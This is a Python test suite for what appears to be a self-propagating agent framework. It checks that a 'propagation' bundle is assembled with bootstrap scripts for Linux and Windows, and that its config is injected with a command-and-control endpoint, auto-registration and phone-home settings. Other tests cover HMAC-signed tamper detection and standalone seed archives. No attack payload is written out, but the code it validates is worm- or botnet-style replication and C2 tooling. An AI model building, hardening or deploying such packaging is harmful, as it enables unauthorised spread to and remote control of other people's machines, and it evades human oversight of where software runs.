#!/usr/bin/env python3
"""
Unit and Integration Tests for Option B: Replication Packaging Hardening
Validates:
1. Bundle assembly with modules, C2 injection, bootstrap scripts, and manifest.
2. Cryptographic integrity checking (SHA-256 + HMAC-SHA256).
3. Tamper detection on file modification and missing files.
4. Standalone archive creation (.tar.gz and .zip).
5. core.replication packaging and verification helpers.
"""

import os
import sys
import json
import shutil
import tempfile
from pathlib import Path

# Add project root to path
PROJECT_ROOT = Path(__file__).parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from agents.propagation_agents import PropagationAgent
from core.replication import package_propagation_seed, verify_seed_integrity


def test_prepare_bundle_structure_and_manifest():
    agent = PropagationAgent()
    bundle = agent._prepare_bundle()
    try:
        assert bundle.exists() and bundle.is_dir(), "Bundle directory does not exist"

        # Check required components
        assert (bundle / "agents").exists(), "Missing agents/ directory in bundle"
        assert (bundle / "run.py").exists(), "Missing run.py in bundle"
        assert (bundle / "requirements.txt").exists(), "Missing requirements.txt in bundle"
        assert (bundle / "config.json").exists(), "Missing config.json in bundle"
        assert (bundle / "bootstrap.sh").exists(), "Missing bootstrap.sh in bundle"
        assert (bundle / "bootstrap.ps1").exists(), "Missing bootstrap.ps1 in bundle"
        assert (bundle / "manifest.json").exists(), "Missing manifest.json in bundle"

        # Verify C2 injection in config.json
        with open(bundle / "config.json", "r", encoding="utf-8") as f:
            cfg = json.load(f)
        assert cfg.get("agent", {}).get("auto_register") is True, "auto_register not True"
        assert cfg.get("swarm", {}).get("phone_home_enabled") is True, "phone_home_enabled not True"
        assert "c2_endpoint" in cfg.get("agent", {}), "c2_endpoint missing"

        # Verify manifest.json
        with open(bundle / "manifest.json", "r", encoding="utf-8") as f:
            manifest = json.load(f)
        assert "files" in manifest, "Manifest missing files"
        assert "hmac_signature" in manifest, "Manifest missing hmac_signature"
        assert manifest["file_count"] == len(manifest["files"]), "File count mismatch"
        assert "run.py" in manifest["files"], "run.py not in manifest files"
        assert "config.json" in manifest["files"], "config.json not in manifest files"
    finally:
        shutil.rmtree(bundle, ignore_errors=True)


def test_bundle_integrity_verification_and_tampering():
    agent = PropagationAgent()
    bundle = agent._prepare_bundle()
    try:
        # Untampered verification (with matching hmac key)
        ok, msg = PropagationAgent.verify_bundle_integrity(bundle, hmac_key=agent.payload_hmac_key)
        assert ok is True, f"Untampered verification failed: {msg}"

        # Untampered verification without HMAC key (SHA256 check only)
        ok_no_hmac, msg_no_hmac = PropagationAgent.verify_bundle_integrity(bundle)
        assert ok_no_hmac is True, f"SHA256-only verification failed: {msg_no_hmac}"

        # Tampering with wrong HMAC key
        ok_bad_key, _ = PropagationAgent.verify_bundle_integrity(bundle, hmac_key="invalid_wrong_key")
        assert ok_bad_key is False, "Expected verification failure with wrong HMAC key"

        # Tampering with a file content
        with open(bundle / "run.py", "a", encoding="utf-8") as f:
            f.write("\n# TAMPERED LINE\n")
        ok_tampered, _ = PropagationAgent.verify_bundle_integrity(bundle)
        assert ok_tampered is False, "Expected verification failure after tampering with run.py"
    finally:
        shutil.rmtree(bundle, ignore_errors=True)


def test_standalone_package_creation():
    agent = PropagationAgent()
    tmp_out = Path(tempfile.mkdtemp(prefix="br_test_pkg_"))
    try:
        # Test tar.gz package
        tar_pkg = agent.create_standalone_package(output_dir=tmp_out, archive_format="tar.gz")
        assert tar_pkg.exists() and tar_pkg.name.endswith(".tar.gz")
        assert tar_pkg.stat().st_size > 1000, "Package too small"

        # Test zip package
        zip_pkg = agent.create_standalone_package(output_dir=tmp_out, archive_format="zip")
        assert zip_pkg.exists() and zip_pkg.name.endswith(".zip")
        assert zip_pkg.stat().st_size > 1000, "Zip package too small"
    finally:
        shutil.rmtree(tmp_out, ignore_errors=True)


def test_core_replication_helpers():
    tmp_out = Path(tempfile.mkdtemp(prefix="br_test_core_"))
    try:
        pkg_path = package_propagation_seed(output_dir=str(tmp_out), archive_format="zip")
        assert pkg_path != "", "package_propagation_seed returned empty path"
        assert Path(pkg_path).exists(), f"Generated seed package not found: {pkg_path}"
    finally:
        shutil.rmtree(tmp_out, ignore_errors=True)
